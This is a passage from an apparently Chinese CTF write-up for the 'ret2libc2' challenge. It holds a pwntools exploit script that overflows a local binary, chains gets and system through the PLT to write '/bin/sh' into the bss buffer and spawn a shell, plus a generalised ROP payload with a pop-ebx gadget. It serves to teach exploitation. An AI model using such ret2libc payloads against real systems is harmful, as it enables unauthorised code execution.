+ 这道题构造的 `payload` 打出之后栈里面应该是这样的

  ![image-20201020173326671](https://raw.githubusercontent.com/smallzhong/picgo-pic-bed/master/image-20201020173326671.png)

+ 代码如下

  ```python3
  #!usr/python
  #coding:utf-8
  
  from pwn import *
  
  io = process("./ret2libc2")
  
  elf = ELF("./ret2libc2")
  
  system_plt = elf.plt["system"]
  
  get_plt = elf.plt["gets"]
  
  buf2 = 0x0804A080  # bss段的buf2
  
  # bin_sh = next(elf.search(b"/bin/sh"))  # elf.search返回的是一个迭代器，要用next获取第一个元素
  
  print(hex(get_plt))
  
  print(hex(system_plt))
  
  payload = flat([b'A' * 112, get_plt, system_plt, buf2, buf2])
  
  io.sendline(payload)
  
  io.sendline(b'/bin/sh\0x00')  # 保险起见最后加上一个EOF
  
  io.interactive()
  ```

+ 这是仅用两个函数达到目的的情况，实际如果需要使用多个函数的话通用的 `payload` 要这样构造

  ```python3
  payload = flat([b'A' * 112, get_plt, pop_ebx_ret, buf2, system_plt, b'AAAA', buf2])
  ```

  这样在调用一个函数之后通过一块 `pop ebx ret` 的gadget帮我们平衡堆栈，最后再调用 `system` 。